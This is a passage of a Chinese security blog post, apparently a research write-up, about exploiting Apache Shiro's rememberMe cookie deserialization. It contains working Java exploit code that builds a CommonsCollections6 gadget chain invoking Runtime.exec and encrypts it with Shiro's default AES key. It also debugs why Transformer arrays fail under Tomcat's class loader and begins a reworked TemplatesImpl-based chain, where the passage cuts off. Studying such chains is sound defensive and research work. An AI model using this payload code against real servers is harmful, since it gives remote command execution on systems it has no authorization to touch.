</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#f92672>[]</span><span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>payloads</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>CommonsCollections6</span><span style=color:#f92672>().</span><span style=color:#75af00>getPayload</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;whoami&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>AesCipherService</span> <span style=color:#111>aes</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>AesCipherService</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>key</span> <span style=color:#f92672>=</span> <span style=color:#111>java</span><span style=color:#f92672>.</span><span style=color:#75af00>util</span><span style=color:#f92672>.</span><span style=color:#75af00>Base64</span><span style=color:#f92672>.</span><span style=color:#75af00>getDecoder</span><span style=color:#f92672>().</span><span style=color:#75af00>decode</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteSource</span> <span style=color:#111>ciphertext</span> <span style=color:#f92672>=</span> <span style=color:#111>aes</span><span style=color:#f92672>.</span><span style=color:#75af00>encrypt</span><span style=color:#f92672>(</span><span style=color:#111>payloads</span><span style=color:#f92672>,</span> <span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>printf</span><span style=color:#f92672>(</span><span style=color:#111>ciphertext</span><span style=color:#f92672>.</span><span style=color:#75af00>toString</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>com.govuln.shiroattack</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.LazyMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CommonsCollections6</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>getPayload</span><span style=color:#f92672>(</span><span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>fakeTransformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span><span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>Class</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#d88200>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>                        <span style=color:#111>Object</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>command</span> <span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span><span style=color:#111>fakeTransformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>outerMap</span> <span style=color:#f92672>=</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>TiedMapEntry</span> <span style=color:#111>tme</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TiedMapEntry</span><span style=color:#f92672>(</span><span style=color:#111>outerMap</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;keykey&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>expMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>expMap</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>tme</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;valuevalue&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>outerMap</span><span style=color:#f92672>.</span><span style=color:#75af00>remove</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;keykey&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>Field</span> <span style=color:#111>f</span> <span style=color:#f92672>=</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredField</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;iTransformers&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#75af00>set</span><span style=color:#f92672>(</span><span style=color:#111>transformerChain</span><span style=color:#f92672>,</span> <span style=color:#111>transformers</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>expMap</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>barr</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>将生成结果发送，但是console疯狂报错</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220301212540550.png alt=image-20220301212540550></p><p>看到这个<code>org.apache.shiro.io.ClassResolvingObjectInputStream</code>，它重写了<code>resolveClass</code>方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>ClassResolvingObjectInputStream</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>ObjectInputStream</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#75af00>ClassResolvingObjectInputStream</span><span style=color:#f92672>(</span><span style=color:#111>InputStream</span> <span style=color:#111>inputStream</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>super</span><span style=color:#f92672>(</span><span style=color:#111>inputStream</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#111>Class</span><span style=color:#f92672>&lt;?&gt;</span> <span style=color:#111>resolveClass</span><span style=color:#f92672>(</span><span style=color:#111>ObjectStreamClass</span> <span style=color:#111>osc</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span><span style=color:#f92672>,</span> <span style=color:#111>ClassNotFoundException</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>ClassUtils</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#111>osc</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>UnknownClassException</span> <span style=color:#111>var3</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ClassNotFoundException</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Unable to load ObjectStreamClass [&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>osc</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;]: &#34;</span><span style=color:#f92672>,</span> <span style=color:#111>var3</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>这是反序列化中用来查找类的方法，它重写了<code>ObjectInputStream</code></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>protected</span> <span style=color:#111>Class</span><span style=color:#f92672>&lt;?&gt;</span> <span style=color:#111>resolveClass</span><span style=color:#f92672>(</span><span style=color:#111>ObjectStreamClass</span> <span style=color:#111>desc</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>throws</span> <span style=color:#111>IOException</span><span style=color:#f92672>,</span> <span style=color:#111>ClassNotFoundException</span>
</span></span><span style=display:flex><span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>name</span> <span style=color:#f92672>=</span> <span style=color:#111>desc</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>,</span> <span style=color:#111>latestUserDefinedLoader</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>ClassNotFoundException</span> <span style=color:#111>ex</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Class</span><span style=color:#f92672>&lt;?&gt;</span> <span style=color:#111>cl</span> <span style=color:#f92672>=</span> <span style=color:#111>primClasses</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#f92672>(</span><span style=color:#111>cl</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>cl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>else</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>throw</span> <span style=color:#111>ex</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>注意到前者用的是<code>org.apache.shiro.util.ClassUtils#forName</code>（内部是<code>org.apache.catalina.loader.ParallelwebappClassLoader#loadClass</code>），而父类用的是<code>Class.forName</code></p><p>我们在上面的位置打断点调试一下；注意如果断不下来，可以考虑往前找一找调用关系，比如org.apache.shiro.mgt.AbstractRememberMeManager#decrypt，它执行cookie部分的解码，中间触发反序列化</p><p><code>resolveClass</code>依次得到我们链子中的LazyMap等等 都很正常，问题出在突然出现的<code>[Lorg.apache.commons.collections.Transformer;</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302012117925.png alt=image-20220302012117925></p><p><code>clazz==null</code>，抛出异常，但并不是因它是<code>[L</code>标记的数组这一点导致报错，因为在它后面还有<code>fqcn="[Ljava.lang.Object;"</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302013221745.png alt=image-20220302013221745></p><p>它就没有返回null，后面还有好几个都带<code>[L</code>标记的对象，都没有返回null，这样的猜测显然是错误的</p><p>重新发包并继续断在<code>loadClass</code></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302014123306.png alt=image-20220302014123306></p><p>我们注意到这里使用的<code>ClassLoader</code>是上面的<code>ParallelWebappClassLoader</code>，而它的工作模式就是这里的bug之处</p><p><img src=https://images2015.cnblogs.com/blog/722072/201706/722072-20170623200651991-1212784795.png alt=img></p><p>java装载类时遵循“全盘负责委托机制”，“全盘负责”指的是当一个ClassLoader装载一个类时，除非显示地使用另外一个ClassLoder，否则该类所依赖及引用的类也由这个ClassLoder载入；“委托机制”指先委托父类装载器寻找目标类，只有在找不到的情况下才从自己的类路径中查找并装载目标类，对应到这里，当它找不到时就会用上面的<code>URLClassLoader</code></p><p>（特别注意的是，<code>WeappClassLoader</code>默认不适用委托机制</p><p>正常的class解析后path是最前面加<code>/</code>，<code>.</code>换为<code>/</code>，</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302015732344.png alt=image-20220302015732344></p><p>之后这个值会传入hashMap作为key，我们直接在key的地方断，发现Transformer数组传入稍有点特殊（数组都这样</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020435664.png alt=image-20220302020435664></p><p>问题是它在前一步调用的是上层的<code>URLClassLoader</code>！</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020339145.png alt=image-20220302020339145></p><p>对照其它带<code>[L</code>的对象</p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020711367.png alt=image-20220302020711367></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302020959932.png alt=image-20220302020959932></p><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302021055809.png alt=image-20220302021055809></p><p>被正常解析</p><p>经过上面的调试我们可以得出结论：当反序列化流中出现非java自身的数组，会引起<code>ParallelWebappClassLoader</code>触发双亲委托机制，将对象交给上层的<code>URLClassLoader</code>进行处理，由于参数的不匹配，自然就出现无法加载类的错误</p><h3 id=搞个行的>搞个行的</h3><p>既然问题出在非java原生的Transformer数组上，我们把它换为<code>TiedMapEntry</code>，构造函数接收两个参数 Map和Key，它有一个<code>getValue</code>方法</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>getValue</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>当我们出传入的map是LazyMap时，这个get就可以触发transform的回调了</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>key</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>containsKey</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>		<span style=color:#111>Object</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#111>factory</span><span style=color:#f92672>.</span><span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>		<span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>return</span> <span style=color:#111>value</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>前面用到<code>get</code>时我们并不关心传入的key，因为重点在Transformer数组的ConstantTransformer，我们通过它来初始化恶意对象</p><p>而仔细看这里的key会被传入<code>transform</code>，它可以扮演ConstantTransformer的角色</p><p>再回看Transformer数组</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;newTransformer&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>null</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>null</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>};</span>
</span></span></code></pre></div><p>第二行可以去掉，数组长度变为1，数组也不需要了</p><p>编写一下exp</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ysoserial.payloads</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.keyvalue.TiedMapEntry</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.LazyMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ByteArrayOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.io.ObjectOutputStream</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Field</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>testCC6Shiro</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>getPayload</span><span style=color:#f92672>(</span><span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#111>clsBytes</span><span style=color:#f92672>)</span><span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>TemplatesImpl</span> <span style=color:#111>obj</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TemplatesImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;_bytecodes&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[][]{</span><span style=color:#111>clsBytes</span><span style=color:#f92672>});</span>
